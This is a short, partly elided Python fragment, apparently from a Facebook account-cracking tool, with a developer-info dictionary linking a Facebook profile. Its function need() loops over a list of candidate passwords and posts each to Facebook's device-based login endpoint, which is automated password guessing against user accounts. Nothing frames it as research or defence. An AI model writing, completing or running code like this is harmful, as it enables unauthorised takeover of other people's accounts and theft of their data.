...
devoloper_info={
    ...
    "Facebook" :  'https://www.facebook.com/labibislam21',
    }
...
def need(uid,pwx,fb,tl):
    ...
    try:
        for ps in pwx:
            ...
            session.post(url=f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=info,headers=update).text
